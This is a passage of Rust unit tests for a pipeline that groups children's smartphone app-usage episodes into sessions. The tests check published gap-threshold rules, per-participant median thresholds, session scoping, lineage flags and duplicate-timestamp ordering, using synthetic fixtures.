        episodes
            .iter()
            .map(|(study, participant, username, package, start, stop)| {
                let mut row = rows_from_events(&[("2026-03-07 10:00:00", APP_USAGE, package)])
                    .pop()
                    .expect("one row");
                {
                    let data = row.edit_classification();
                    *data.study_id = intern_deserialized_str(study);
                    *data.participant_id = intern_deserialized_str(participant);
                    *data.username = intern_deserialized_str(username);
                    *data.app_package_name = intern_deserialized_str(package);
                    *data.interaction_type = intern_deserialized_str(APP_USAGE);
                }
                {
                    let data = row.edit_temporal();
                    *data.start_timestamp_ns = Some(*start);
                    *data.stop_timestamp_ns = Some(*stop);
                }
                row
            })
            .collect()
    }

    fn scoped_session_ids(
        episodes: &[(&str, &str, &str, &str, i64, i64)],
        rules: SessionGroupingRules,
    ) -> Vec<Option<i64>> {
        let mut rows = scoped_usage_rows(episodes);
        assign_usage_session_ids(&mut rows, rules);
        rows.iter().map(|row| row.usage_session_id).collect()
    }

    fn scoped_flags(
        episodes: &[(&str, &str, &str, &str, i64, i64)],
        rules: SessionGroupingRules,
    ) -> Vec<String> {
        let mut rows = scoped_usage_rows(episodes);
        assign_usage_session_ids(&mut rows, rules);
        rows.iter()
            .map(|row| row.any_app_usage_flags.to_string())
            .collect()
    }

    /// Peng & Zhu (2020): "the median score of a user's inter-app intervals
    /// is adopted for each user" — one file, two participants, two different
    /// thresholds. The same 200 s of silence joins for the participant whose
    /// median is 300 s and would break for the one whose median is 10 s.
    #[test]
    fn peng_zhu_derives_a_separate_median_per_participant() {
        let episodes = [
            // P01 gaps in start order: 5 s, 10 s, 100 s → median 10 s.
            ("P01", "com.a", 0, 10 * SESSION_S),
            ("P01", "com.a", 15 * SESSION_S, 25 * SESSION_S),
            ("P01", "com.a", 35 * SESSION_S, 45 * SESSION_S),
            ("P01", "com.a", 145 * SESSION_S, 155 * SESSION_S),
            // P02 gaps: 200 s, 300 s, 400 s → median 300 s.
            ("P02", "com.b", 0, 10 * SESSION_S),
            ("P02", "com.b", 210 * SESSION_S, 220 * SESSION_S),
            ("P02", "com.b", 520 * SESSION_S, 530 * SESSION_S),
            ("P02", "com.b", 930 * SESSION_S, 940 * SESSION_S),
        ];
        assert_eq!(
            session_ids(
                &episodes,
                SessionGroupingPolicy::PengZhu2020ParticipantMedian
            ),
            vec![
                // P01: 5 < 10 joins; 10 >= 10 breaks; 100 breaks.
                Some(0),
                Some(0),
                Some(1),
                Some(2),
                // P02: 200 < 300 joins — the gap that would break P01 —
                // 300 >= 300 breaks; 400 breaks.
                Some(0),
                Some(0),
                Some(1),
                Some(2),
            ],
        );
    }

    /// The comparison is integer-exact at the boundary, including the
    /// half-nanosecond median an even interval count can produce: gaps of
    /// [10, 15, 16, 21] ns have median 15.5 ns, a value no gap can ever
    /// equal, and the doubled-space comparison places 15 ns (join) and 16 ns
    /// (break) on the correct sides without any rounding.
    #[test]
    fn peng_zhu_boundary_is_exact_including_half_nanosecond_medians() {
        // Odd count, whole median: gaps 10 s, 20 s, 40 s → median 20 s.
        // Equality splits ("smaller than … joins"), one nanosecond less joins.
        let odd = [
            ("P01", "com.a", 0, 10 * SESSION_S),
            ("P01", "com.a", 20 * SESSION_S, 30 * SESSION_S),
            ("P01", "com.a", 50 * SESSION_S, 60 * SESSION_S),
            ("P01", "com.a", 100 * SESSION_S, 110 * SESSION_S),
        ];
        assert_eq!(
            session_ids(&odd, SessionGroupingPolicy::PengZhu2020ParticipantMedian),
            vec![Some(0), Some(0), Some(1), Some(2)],
            "10 < 20 joins; exactly 20 breaks; 40 breaks",
        );
        // Nudging a gap moves the median it is compared against — the probed
        // gap is itself part of the statistic — so the one-nanosecond-inside
        // probe needs an even count where the two middle gaps straddle it:
        // gaps 10 s, 20 s − 1 ns, 20 s, 40 s give a doubled median of
        // 40 s − 1 ns (median 20 s − 0.5 ns). The 20 s − 1 ns gap sits one
        // nanosecond inside and joins; the exact 20 s gap sits half a
        // nanosecond beyond and breaks.
        let just_under = [
            ("P01", "com.a", 0, 10 * SESSION_S),
            ("P01", "com.a", 20 * SESSION_S, 30 * SESSION_S),
            ("P01", "com.a", 50 * SESSION_S - 1, 60 * SESSION_S),
            ("P01", "com.a", 80 * SESSION_S, 90 * SESSION_S),
            ("P01", "com.a", 130 * SESSION_S, 140 * SESSION_S),
        ];
        assert_eq!(
            session_ids(
                &just_under,
                SessionGroupingPolicy::PengZhu2020ParticipantMedian
            ),
            vec![Some(0), Some(0), Some(0), Some(1), Some(2)],
        );

        // Even count at nanosecond scale: gaps 10, 21, 15, 16 ns in start
        // order sort to [10, 15, 16, 21] → doubled median 31 ns.
        let half = [
            ("P01", "com.a", 0, 100),
            ("P01", "com.a", 110, 200), // gap 10 ns: 20 < 31 joins
            ("P01", "com.a", 221, 300), // gap 21 ns: 42 >= 31 breaks
            ("P01", "com.a", 315, 400), // gap 15 ns: 30 < 31 joins
            ("P01", "com.a", 416, 500), // gap 16 ns: 32 >= 31 breaks
        ];
        assert_eq!(
            session_ids(&half, SessionGroupingPolicy::PengZhu2020ParticipantMedian),
            vec![Some(0), Some(0), Some(1), Some(1), Some(2)],
        );
    }

    /// Degenerate partitions stay deterministic with no invented knobs: one
    /// episode has no interval and nothing to compare; two episodes have one
    /// interval, the median IS that gap, and equality splits — their rule
    /// applied verbatim, not a special case.
    #[test]
    fn peng_zhu_degenerate_partitions_follow_the_rule_verbatim() {
        assert_eq!(
            session_ids(
                &[("P01", "com.a", 0, 10 * SESSION_S)],
                SessionGroupingPolicy::PengZhu2020ParticipantMedian,
            ),
            vec![Some(0)],
        );
        assert_eq!(
            session_ids(
                &[
                    ("P01", "com.a", 0, 10 * SESSION_S),
                    ("P01", "com.a", 20 * SESSION_S, 30 * SESSION_S),
                ],
                SessionGroupingPolicy::PengZhu2020ParticipantMedian,
            ),
            vec![Some(0), Some(1)],
            "one interval: the gap equals its own median and splits",
        );
    }

    /// The derived threshold is reconstructible from the export: the OPEN flag
    /// names the partition's median and the interval count it was computed
    /// over, in the same `js_number_to_string` rendering every other flag
    /// uses — including a fractional median.
    #[test]
    fn peng_zhu_lineage_names_the_median_and_its_interval_count() {
        let rules = SessionGroupingRules {
            policy: SessionGroupingPolicy::PengZhu2020ParticipantMedian,
            emit_lineage: true,
            ..SessionGroupingRules::default()
        };
        // Gaps 10 s, 15 s, 20 s → median 15 s over 3 intervals.
        assert_eq!(
            scoped_flags(
                &[
                    ("S", "P01", "Target Child", "com.a", 0, 10 * SESSION_S),
                    (
                        "S",
                        "P01",
                        "Target Child",
                        "com.a",
                        20 * SESSION_S,
                        30 * SESSION_S,
                    ),
                    (
                        "S",
                        "P01",
                        "Target Child",
                        "com.a",
                        45 * SESSION_S,
                        55 * SESSION_S,
                    ),
                    (
                        "S",
                        "P01",
                        "Target Child",
                        "com.a",
                        75 * SESSION_S,
                        85 * SESSION_S,
                    ),
                ],
                rules,
            ),
            vec![
                "['SESSION 0 OPEN MEDIAN 15 S N 3']".to_string(),
                "['SESSION 0 JOIN GAP 10 S']".to_string(),
                "['SESSION 1 BREAK GAP 15 S']".to_string(),
                "['SESSION 2 BREAK GAP 20 S']".to_string(),
            ],
        );
        // Gaps 10 s and 21 s → median 15.5 s over 2 intervals: the halved
        // doubled median renders exactly, not as a rounded integer.
        assert_eq!(
            scoped_flags(
                &[
                    ("S", "P01", "Target Child", "com.a", 0, 10 * SESSION_S),
                    (
                        "S",
                        "P01",
                        "Target Child",
                        "com.a",
                        20 * SESSION_S,
                        30 * SESSION_S,
                    ),
                    (
                        "S",
                        "P01",
                        "Target Child",
                        "com.a",
                        51 * SESSION_S,
                        61 * SESSION_S,
                    ),
                ],
                rules,
            ),
            vec![
                "['SESSION 0 OPEN MEDIAN 15.5 S N 2']".to_string(),
                "['SESSION 0 JOIN GAP 10 S']".to_string(),
                "['SESSION 1 BREAK GAP 21 S']".to_string(),
            ],
        );
        // A one-episode partition has no intervals and the OPEN flag says
        // nothing it cannot know.
        assert_eq!(
            scoped_flags(
                &[("S", "P01", "Target Child", "com.a", 0, 10 * SESSION_S)],
                rules,
            ),
            vec!["['SESSION 0 OPEN']".to_string()],
        );
    }

    /// The median is derived from previous-stop → next-start intervals even
    /// when the WALK measures its gaps from the running-maximum stop.
    /// Deriving it from the running-maximum reading would be circular — that
    /// reading depends on which episodes are already in the session — so the
    /// statistic is fixed and only the comparison follows the basis. The OPEN
    /// flag must therefore name the same median under both bases.
    #[test]
    fn peng_zhu_median_ignores_the_gap_basis_departure() {
        // A covers 30 min with B nested inside it; C starts 20 s after A ends.
        // Previous-stop intervals: B − A = −1740 s, C − B = 1700 s → the
        // median is (−1740 + 1700) / 2 = −20 s under BOTH bases.
        let episodes = [
            ("S", "P01", "Target Child", "com.a", 0, 1800 * SESSION_S),
            (
                "S",
                "P01",
                "Target Child",
                "com.b",
                60 * SESSION_S,
                120 * SESSION_S,
            ),
            (
                "S",
                "P01",
                "Target Child",
                "com.c",
                1820 * SESSION_S,
                1860 * SESSION_S,
            ),
        ];
        let published = SessionGroupingRules {
            policy: SessionGroupingPolicy::PengZhu2020ParticipantMedian,
            emit_lineage: true,
            ..SessionGroupingRules::default()
        };
        let running_max = SessionGroupingRules {
            gap_basis: SessionGapBasis::SessionRunningMaximumStop,
            ..published
        };
        let published_flags = scoped_flags(&episodes, published);
        let running_max_flags = scoped_flags(&episodes, running_max);
        assert_eq!(
            published_flags[0], "['SESSION 0 OPEN MEDIAN -20 S N 2']",
            "the derived median is the previous-stop statistic",
        );
        assert_eq!(
            running_max_flags[0], published_flags[0],
            "the basis departure must not move the derived median",
        );
        // The comparisons still follow the basis: B's gap is −1740 s either
        // way, but C's is 1700 s from B's stop and 20 s from the session's
        // furthest stop — both at or above −20 s, so both bases break at C.
        assert_eq!(
            scoped_session_ids(&episodes, published),
            vec![Some(0), Some(0), Some(1)],
        );
        assert_eq!(
            scoped_session_ids(&episodes, running_max),
            vec![Some(0), Some(0), Some(1)],
        );
        assert_eq!(running_max_flags[2], "['SESSION 1 BREAK GAP 20 S']");
        assert_eq!(published_flags[2], "['SESSION 1 BREAK GAP 1700 S']");
    }

    /// The doubled-space comparison is exactly the old comparison for every
    /// fixed arm, probed at the only points where a rewrite could move it:
    /// one nanosecond inside the constant, exactly the constant, and one
    /// nanosecond beyond it.
    #[test]
    fn fixed_arms_keep_their_exact_boundaries_under_the_doubled_comparison() {
        for policy in SessionGroupingPolicy::ALL {
            let Some(SessionGapThreshold::FixedNs(t)) = policy.gap_threshold() else {
                continue;
            };
            let ids_for_gap = |gap: i64| {
                session_ids(
                    &[
                        ("P01", "com.a", 0, 10 * SESSION_S),
                        ("P01", "com.a", 10 * SESSION_S + gap, 20 * SESSION_S + gap),
                    ],
                    *policy,
                )
            };
            assert_eq!(
                ids_for_gap(t - 1),
                vec![Some(0), Some(0)],
                "{}: one nanosecond inside the constant joins",
                policy.canonical_id(),
            );
            let at_boundary = if policy.boundary_gap_starts_new_session() {
                vec![Some(0), Some(1)]
            } else {
                vec![Some(0), Some(0)]
            };
            assert_eq!(
                ids_for_gap(t),
                at_boundary,
                "{}: the boundary keeps its published side",
                policy.canonical_id(),
            );
            assert_eq!(
                ids_for_gap(t + 1),
                vec![Some(0), Some(1)],
                "{}: one nanosecond beyond the constant breaks",
                policy.canonical_id(),
            );
        }
    }

    /// An episode nested inside a longer one pulls the measuring point
    /// backwards, so the published reading splits a session the participant
    /// never left. This is the defect the gap-basis axis exists for, and both
    /// readings are pinned so neither can be changed silently.
    #[test]
    fn a_nested_episode_splits_a_session_only_under_the_published_gap_basis() {
        // A runs for 30 min. B is nested entirely inside it. C starts 20 s
        // after A ends, so the participant's screen was covered continuously
        // and no 60 s silence exists anywhere in this input.
        let episodes = [
            ("P01", "com.a", 0, 1800 * SESSION_S),
            ("P01", "com.b", 60 * SESSION_S, 120 * SESSION_S),
            ("P01", "com.c", 1820 * SESSION_S, 1860 * SESSION_S),
        ];

        // Published: the gap for C is measured from B's stop, 28 min 20 s.
        assert_eq!(
            session_ids(&episodes, SessionGroupingPolicy::ZerrerSixtySeconds),
            vec![Some(0), Some(0), Some(1)],
            "the published reading measures from the nested episode and splits",
        );

        // Running maximum: the gap for C is measured from A's stop, 20 s.
        assert_eq!(
            scoped_session_ids(
                &[
                    ("S", "P01", "Target Child", "com.a", 0, 1800 * SESSION_S),
                    (
                        "S",
                        "P01",
                        "Target Child",
                        "com.b",
                        60 * SESSION_S,
                        120 * SESSION_S,
                    ),
                    (
                        "S",
                        "P01",
                        "Target Child",
                        "com.c",
                        1820 * SESSION_S,
                        1860 * SESSION_S,
                    ),
                ],
                SessionGroupingRules {
                    policy: SessionGroupingPolicy::ZerrerSixtySeconds,
                    gap_basis: SessionGapBasis::SessionRunningMaximumStop,
                    ..SessionGroupingRules::default()
                },
            ),
            vec![Some(0), Some(0), Some(0)],
            "measuring from the session's furthest stop keeps the coverage together",
        );

        // With no overlap anywhere the two bases must agree exactly, which is
        // what makes the departure narrow: it can only ever affect an input the
        // published rules were not stated over.
        let disjoint = [
            ("S", "P01", "Target Child", "com.a", 0, 60 * SESSION_S),
            (
                "S",
                "P01",
                "Target Child",
                "com.b",
                70 * SESSION_S,
                90 * SESSION_S,
            ),
            (
                "S",
                "P01",
                "Target Child",
                "com.c",
                200 * SESSION_S,
                210 * SESSION_S,
            ),
        ];
        assert_eq!(
            scoped_session_ids(&disjoint, SessionGroupingRules::default_policy_only()),
            scoped_session_ids(
                &disjoint,
                SessionGroupingRules {
                    gap_basis: SessionGapBasis::SessionRunningMaximumStop,
                    ..SessionGroupingRules::default_policy_only()
                },
            ),
        );
    }

    /// A row belonging to another study, or to another person on a shared
    /// device, lands inside a participant's silence and bridges it. The
    /// participant's session is then never split — a MISSED break, not a
    /// spurious one, which is why no existing test caught it.
    #[test]
    fn a_foreign_row_bridges_a_silence_until_the_boundary_scope_is_widened() {
        // Study A is silent from 60 s to 1010 s — 950 s, far past any policy's
        // threshold. Study B's episode sits inside that silence.
        let across_studies = [
            ("StudyA", "P01", "Target Child", "com.a", 0, 60 * SESSION_S),
            (
                "StudyB",
                "P01",
                "Target Child",
                "com.b",
                65 * SESSION_S,
                1000 * SESSION_S,
            ),
            (
                "StudyA",
                "P01",
                "Target Child",
                "com.a",
                1010 * SESSION_S,
                1020 * SESSION_S,
            ),
        ];
        assert_eq!(
            scoped_session_ids(&across_studies, SessionGroupingRules::default_policy_only()),
            vec![Some(0), Some(0), Some(0)],
            "partitioning by participant alone lets the other study bridge the silence",
        );
        assert_eq!(
            scoped_session_ids(
                &across_studies,
                SessionGroupingRules {
                    scope: SessionBoundaryScope::ParticipantAndStudy,
                    ..SessionGroupingRules::default_policy_only()
                },
            ),
            vec![Some(0), Some(0), Some(1)],
            "adding study_id splits study A's 950 s silence and numbers study B alone",
        );

        // The same shape one level down: two people on one shared device, with
        // no device-sharing file configured to reclassify either.
        let across_people = [
            ("StudyA", "P01", "Target Child", "com.a", 0, 60 * SESSION_S),
            (
                "StudyA",
                "P01",
                "Sibling",
                "com.b",
                65 * SESSION_S,
                1000 * SESSION_S,
            ),
            (
                "StudyA",
                "P01",
                "Target Child",
                "com.a",
                1010 * SESSION_S,
                1020 * SESSION_S,
            ),
        ];
        assert_eq!(
            scoped_session_ids(
                &across_people,
                SessionGroupingRules {
                    scope: SessionBoundaryScope::ParticipantAndStudy,
                    ..SessionGroupingRules::default_policy_only()
                },
            ),
            vec![Some(0), Some(0), Some(0)],
            "study scope cannot see the sibling; the silence is still bridged",
        );
        assert_eq!(
            scoped_session_ids(
                &across_people,
                SessionGroupingRules {
                    scope: SessionBoundaryScope::ParticipantStudyAndPerson,
                    ..SessionGroupingRules::default_policy_only()
                },
            ),
            vec![Some(0), Some(0), Some(1)],
            "adding username separates the two people on the shared device",
        );
    }

    /// The lineage flag states which rule placed each row and what gap it saw.
    /// It rides in `any_app_usage_flags`, so a run with it on is
    /// schema-compatible with one with it off.
    #[test]
    fn session_break_lineage_names_the_rule_and_the_observed_gap() {
        let episodes = [
            ("S", "P01", "Target Child", "com.a", 0, 60 * SESSION_S),
            (
                "S",
                "P01",
                "Target Child",
                "com.b",
                70 * SESSION_S,
                90 * SESSION_S,
            ),
            (
                "S",
                "P01",
                "Target Child",
                "com.c",
                200 * SESSION_S,
                210 * SESSION_S,
            ),
        ];

        // Off: the flags column keeps the empty-list value it arrived with.
        // Nothing is appended at all, which is what keeps the app table
        // byte-identical when the axis is not selected.
        assert_eq!(
            scoped_flags(&episodes, SessionGroupingRules::default_policy_only()),
            vec!["[]".to_string(), "[]".to_string(), "[]".to_string()],
        );

        assert_eq!(
            scoped_flags(
                &episodes,
                SessionGroupingRules {
                    emit_lineage: true,
                    ..SessionGroupingRules::default_policy_only()
                },
            ),
            vec![
                "['SESSION 0 OPEN']".to_string(),
                "['SESSION 0 JOIN GAP 10 S']".to_string(),
                "['SESSION 1 BREAK GAP 110 S']".to_string(),
            ],
            "the flag names the session, the verdict and the gap it measured",
        );

        // Ross is the only policy with a package clause, and the flag says so
        // rather than leaving a 1 s gap looking like the cause of the break.
        assert_eq!(
            scoped_flags(
                &[
                    ("S", "P01", "Target Child", "com.a", 0, 60 * SESSION_S),
                    (
                        "S",
                        "P01",
                        "Target Child",
                        "com.b",
                        61 * SESSION_S,
                        70 * SESSION_S,
                    ),
                ],
                SessionGroupingRules {
                    policy: SessionGroupingPolicy::RossFifteenSeconds,
                    emit_lineage: true,
                    ..SessionGroupingRules::default()
                },
            ),
            vec![
                "['SESSION 0 OPEN']".to_string(),
                "['SESSION 1 BREAK GAP 1 S APP CHANGE']".to_string(),
            ],
        );

        // The gap the flag reports is the gap the rule actually compared, so
        // under the running-maximum basis it reports THAT number, not the
        // published one. A flag that reported the other endpoint would be a
        // second, disagreeing account of the same decision.
        assert_eq!(
            scoped_flags(
                &[
                    ("S", "P01", "Target Child", "com.a", 0, 1800 * SESSION_S),
                    (
                        "S",
                        "P01",
                        "Target Child",
                        "com.b",
                        60 * SESSION_S,
                        120 * SESSION_S,
                    ),
                    (
                        "S",
                        "P01",
                        "Target Child",
                        "com.c",
                        1820 * SESSION_S,
                        1860 * SESSION_S,
                    ),
                ],
                SessionGroupingRules {
                    gap_basis: SessionGapBasis::SessionRunningMaximumStop,
                    emit_lineage: true,
                    ..SessionGroupingRules::default_policy_only()
                },
            )[2],
            "['SESSION 0 JOIN GAP 20 S']",
        );
    }

    /// The three axes reach the published app table through the whole
    /// pipeline, not only through the numbering function.
    #[test]
    fn the_session_grouping_extensions_reach_the_published_app_table() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            // The same three episodes as the published-policy test: a 10 s gap
            // then a 70 s gap, so a 60 s cut joins the first two and breaks at
            // the third.
            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 12:00:00,UTC\n",
            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 12:02:00,UTC\n",
            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 12:02:10,UTC\n",
            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 12:04:10,UTC\n",
            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 12:05:20,UTC\n",
            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 12:07:20,UTC\n",
        );

        let mut options = test_options();
        options.session_grouping_policy = SessionGroupingPolicy::ZerrerSixtySeconds;
        let plain = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("the grouped run succeeds");

        // Widening the basis and the scope changes nothing on an input with no
        // overlap and one participant, one study and one person — which is the
        // guarantee that makes them safe to expose.
        options.session_gap_basis = SessionGapBasis::SessionRunningMaximumStop;
        options.session_boundary_scope = SessionBoundaryScope::ParticipantStudyAndPerson;
        let widened = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("the widened run succeeds");
        assert_eq!(
            plain.app_csv_bytes, widened.app_csv_bytes,
            "neither axis may move a table it has nothing to act on",
        );

        options.emit_session_break_lineage = true;
        let with_lineage = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("the lineage run succeeds");
        let rows = parse_csv_to_records_with_physical_rows(&with_lineage.app_csv_bytes.to_vec());
        assert_eq!(rows.len(), 3);
        let flags: Vec<String> = rows
            .iter()
            .map(|(_, row)| {
                row.get("any_app_usage_flags")
                    .cloned()
                    .expect("the flags column is always published")
            })
            .collect();
        assert_eq!(
            flags,
            vec![
                "['SESSION 0 OPEN']".to_string(),
                "['SESSION 0 JOIN GAP 10 S']".to_string(),
                "['SESSION 1 BREAK GAP 70 S']".to_string(),
            ],
        );

        // The lineage is additive: it changes the flags column and nothing
        // else, which is what keeps the two runs schema-compatible.
        let plain_rows = parse_csv_to_records_with_physical_rows(&plain.app_csv_bytes.to_vec());
        for (index, (_, row)) in plain_rows.iter().enumerate() {
            for (column, value) in row {
                if column == "any_app_usage_flags" {
                    continue;
                }
                assert_eq!(
                    rows[index].1.get(column),
                    Some(value),
                    "row {index} column {column} moved when only the lineage was turned on",
                );
            }
            assert_eq!(rows[index].1.len(), row.len(), "no column was added");
        }
    }

    #[test]
    fn the_gap_is_measured_from_one_episodes_stop_to_the_next_ones_start() {
        // Starts are 80 s apart but the first episode runs 70 s, so the real
        // gap is 10 s. Measuring start-to-start would wrongly split here under
        // a 60 s rule; measuring next-start minus previous-stop does not.
        let episodes = [
            ("P01", "com.a", 0, 70 * SESSION_S),
            ("P01", "com.b", 80 * SESSION_S, 90 * SESSION_S),
        ];
        assert_eq!(
            session_ids(&episodes, SessionGroupingPolicy::ZerrerSixtySeconds),
            vec![Some(0), Some(0)],
        );
    }

    #[test]
    fn a_gap_exactly_on_the_threshold_preserves_each_sources_comparator() {
        // Zerrer's code is `time_gap > 60`, so exactly 60 s stays joined.
        let sixty = [
            ("P01", "com.a", 0, 0),
            ("P01", "com.a", 60 * SESSION_S, 60 * SESSION_S),
        ];
        assert_eq!(
            session_ids(&sixty, SessionGroupingPolicy::ZerrerSixtySeconds),
            vec![Some(0), Some(0)],
        );
        // Ross counts a sample gap of "at least 15 seconds" as the boundary,
        // so exactly 15 s does split.
        let fifteen = [
            ("P01", "com.a", 0, 0),
            ("P01", "com.a", 15 * SESSION_S, 15 * SESSION_S),
        ];
        assert_eq!(
            session_ids(&fifteen, SessionGroupingPolicy::RossFifteenSeconds),
            vec![Some(0), Some(1)],
        );

        // The deposited SmartphoneUsage_Wellbeing code joins on `< 5`, so a
        // gap one nanosecond inside joins while equality starts a new session.
        let strict_five = [
            ("P01", "com.a", 0, 0),
            ("P01", "com.b", 5 * SESSION_S - 1, 5 * SESSION_S - 1),
            ("P01", "com.c", 10 * SESSION_S - 1, 10 * SESSION_S - 1),
        ];
        assert_eq!(
            session_ids(
                &strict_five,
                SessionGroupingPolicy::SmartphoneWellbeingStrictLtFiveSeconds,
            ),
            vec![Some(0), Some(0), Some(1)],
            "4.999999999 s joins; exactly 5 s splits",
        );
    }

    #[test]
    fn only_ross_ends_a_session_because_the_app_changed() {
        // One second apart, different packages. Every policy but Ross ignores
        // the app entirely.
        let episodes = [
            ("P01", "com.a", 0, 0),
            ("P01", "com.b", SESSION_S, SESSION_S),
        ];
        assert_eq!(
            session_ids(&episodes, SessionGroupingPolicy::ZerrerSixtySeconds),
            vec![Some(0), Some(0)],
        );
        assert_eq!(
            session_ids(&episodes, SessionGroupingPolicy::RossFifteenSeconds),
            vec![Some(0), Some(1)],
        );
    }

    #[test]
    fn sessions_are_numbered_within_each_participant_not_across_them() {
        // Interleaved participants, and P02's episode sits inside P01's gap.
        // Both restart at 0, and P01's long gap still splits despite P02's row
        // landing between them.
        let episodes = [
            ("P01", "com.a", 0, 0),
            ("P02", "com.a", 10 * SESSION_S, 10 * SESSION_S),
            ("P01", "com.a", 100 * SESSION_S, 100 * SESSION_S),
        ];
        assert_eq!(
            session_ids(&episodes, SessionGroupingPolicy::ZerrerSixtySeconds),
            vec![Some(0), Some(0), Some(1)],
        );
    }

    #[test]
    fn an_episode_with_no_interval_is_left_unnumbered() {
        // End-of-Usage-Missing rows have no stop. Placing one in a session
        // would require inventing where it sat relative to its neighbours.
        let mut rows = session_usage_rows(&[
            ("P01", "com.a", 0, 0),
            ("P01", "com.a", 10 * SESSION_S, 10 * SESSION_S),
        ]);
        *rows[0].edit_temporal().stop_timestamp_ns = None;
        assign_usage_session_ids(
            &mut rows,
            SessionGroupingRules::published(SessionGroupingPolicy::ZerrerSixtySeconds),
        );
        assert_eq!(
            rows.iter()
                .map(|row| row.usage_session_id)
                .collect::<Vec<_>>(),
            vec![None, Some(0)],
        );
    }

    #[test]
    fn every_session_policy_round_trips_through_its_canonical_id() {
        for policy in SessionGroupingPolicy::ALL {
            assert_eq!(
                SessionGroupingPolicy::from_canonical_id(policy.canonical_id()),
                *policy,
            );
        }
        // An unrecognised value must never silently select a grouping.
        assert!(
            SessionGroupingPolicy::parse_request_value("zerrer_61s")
                .expect_err("an unknown session_grouping_policy is refused")
                .starts_with("unknown_session_grouping_policy: "),
        );
    }

    pub(super) fn rows_from_events(events: &[(&str, &str, &str)]) -> Vec<Row> {
        let attributed: Vec<(&str, &str, &str, &str)> = events
            .iter()
            .map(|(timestamp, interaction, package)| ("P01", *timestamp, *interaction, *package))
            .collect();
        rows_from_participant_events(&attributed)
    }

    /// `rows_from_events` with the participant named. One raw export can carry
    /// several participants, and the canonical row order interleaves them by
    /// timestamp, so any rule that pairs a start with a later row has to be
    /// exercised against that interleaving rather than a single-participant
    /// stream.
    pub(super) fn rows_from_participant_events(events: &[(&str, &str, &str, &str)]) -> Vec<Row> {
        let mut csv = String::from(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
        );
        for (participant, timestamp, interaction, package) in events {
            csv.push_str(&format!(
                "Study,{participant},Target Child,Label,{interaction},{package},{timestamp},America/Chicago\n"
            ));
        }
        let raw = incremental::decode_source_records(csv.as_bytes());
        let test_models = raw
            .iter()
            .map(|row| (row.participant_id.clone(), "test-device".to_owned()))
            .collect::<BTreeMap<_, _>>();
        incremental::canonicalize_source_rows(
            &raw,
            "America/Chicago",
            &BTreeMap::new(),
            &test_models,
        )
        .expect("canonical rows")
    }

    /// `duplicateTimestampsCorrected` in the review summary is this count: how
    /// many rows had to be moved because they shared a timestamp with an
    /// earlier row. Each tied group of n rows contributes n - 1.
    #[test]
    fn duplicate_timestamp_counting_reports_every_extra_row_in_a_tied_group() {
        let count = |timestamps: &[&str]| {
            let events: Vec<(&str, &str, &str)> = timestamps
                .iter()
                .map(|timestamp| (*timestamp, "Activity Resumed", "com.example.chat"))
                .collect();
            count_duplicate_groups(&rows_from_events(&events))
        };
        assert_eq!(count(&[]), 0);
        assert_eq!(count(&["2026-03-07 10:00:00"]), 0);
        assert_eq!(count(&["2026-03-07 10:00:00", "2026-03-07 10:00:01"]), 0);
        assert_eq!(count(&["2026-03-07 10:00:00", "2026-03-07 10:00:00"]), 1);
        assert_eq!(
            count(&[
                "2026-03-07 10:00:00",
                "2026-03-07 10:00:00",
                "2026-03-07 10:00:00"
            ]),
            2
        );
        // A group in the middle and a group that runs to the end of the file
        // both count; the trailing group is handled after the loop, so it needs
        // its own case.
        assert_eq!(
            count(&[
                "2026-03-07 10:00:00",
                "2026-03-07 10:00:00",
                "2026-03-07 10:00:01",
                "2026-03-07 10:00:02",
                "2026-03-07 10:00:02",
                "2026-03-07 10:00:02"
            ]),
            3
        );
        assert_eq!(
            count(&[
                "2026-03-07 10:00:00",
                "2026-03-07 10:00:01",
                "2026-03-07 10:00:01"
            ]),
            1
        );
    }

    /// Chronicle exports several events on the same second, and the matcher
    /// pairs events in timestamp order, so a tie has to be broken the same way
    /// every run: the start of a usage episode first, ordinary events next, and
    /// the events that can close an episode last. The nudged rows are placed
    /// one microsecond apart immediately before the shared timestamp, so no
    /// nudged row can overtake an event that genuinely came earlier.
    #[test]
    fn duplicate_timestamps_are_nudged_apart_with_resumed_first_and_stops_last() {
        let same_app_stop_types = vec!["Activity Paused".to_string()];
        let other_stop_types = vec!["Device Shutdown".to_string()];
        let shared = parse_chronicle_timestamp_ns("2026-03-07 16:00:00")
            .expect("the fixture timestamp parses");

        let nudged = unalign_duplicate_timestamps(
            rows_from_events(&[
                ("2026-03-07 10:00:00", "Activity Paused", "com.example.chat"),
                (
                    "2026-03-07 10:00:00",
                    "User Interaction",
                    "com.example.chat",
                ),
                (
                    "2026-03-07 10:00:00",
                    "Activity Resumed",
                    "com.example.chat",
                ),
            ]),
            &same_app_stop_types,
            &other_stop_types,
        )
        .expect("duplicate-timestamp adjustment stays representable");
        let observed: Vec<(&str, i64)> = nudged
            .iter()
            .map(|row| (row.interaction_type.as_str(), row.event_timestamp_ns))
            .collect();
        let base = parse_chronicle_timestamp_ns("2026-03-07 10:00:00").expect("fixture timestamp");
        assert_eq!(
            observed,
            vec![
                ("Activity Resumed", base - 3_000),
                ("User Interaction", base - 2_000),
                ("Activity Paused", base - 1_000),
            ]
        );

        // Ties among equal-priority events keep file order, so a re-run of the
        // same export produces the same episodes.
        let stable = unalign_duplicate_timestamps(
            rows_from_events(&[
                ("2026-03-07 16:00:00", "User Interaction", "com.example.a"),
                ("2026-03-07 16:00:00", "User Interaction", "com.example.b"),
            ]),
            &same_app_stop_types,
            &other_stop_types,
        )
        .expect("duplicate-timestamp adjustment stays representable");
        assert_eq!(
            stable
                .iter()
                .map(|row| (row.app_package_name.as_str(), row.event_timestamp_ns))
                .collect::<Vec<_>>(),
            vec![
                ("com.example.a", shared - 2_000),
                ("com.example.b", shared - 1_000),
            ]
